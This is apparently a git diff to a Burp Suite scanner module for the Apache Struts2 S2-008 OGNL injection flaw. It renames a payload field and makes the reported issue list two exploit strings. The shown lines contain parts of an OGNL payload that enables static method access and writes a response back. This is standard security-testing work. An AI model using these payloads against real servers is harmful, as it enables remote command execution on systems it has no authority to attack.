@@ -3,7 +3,6 @@ package module.java.vul;
 import burp.*;
 import module.Util;
 
-import java.io.PrintWriter;
 import java.net.URLEncoder;
 import java.util.Arrays;
 
@@ -21,7 +20,7 @@ public class S2_008 extends IModule {
         "#out.getWriter().flush()," +
         "#out.getWriter().close()" +
         ")";
-    public String exp =
+    public String exp1 =
         "debug=command&expression=" +
         "(" +
         "#_memberAccess.allowStaticMethodAccess=true," +
@@ -74,7 +73,13 @@ public class S2_008 extends IModule {
         String bodyText = new String(body);
         if (bodyText.contains(randomMark)) {
             this.iHttpRequestResponse = newHttpRequestResponse;
-            this.detail = URLEncoder.encode(exp).replace("%3D", "=").replace("%26", "&");
+            StringBuilder sb = new StringBuilder();
+            sb.append("exp1:");
+            sb.append("\n");
+            sb.append(URLEncoder.encode(exp1).replace("%3D", "=").replace("%26", "&"));
+            sb.append("\n");
+            sb.append("exp2:");
+            sb.append(URLEncoder.encode(exp2).replace("%3D", "=").replace("%26", "&"));
             return creatCustomScanIssue();
         }
 
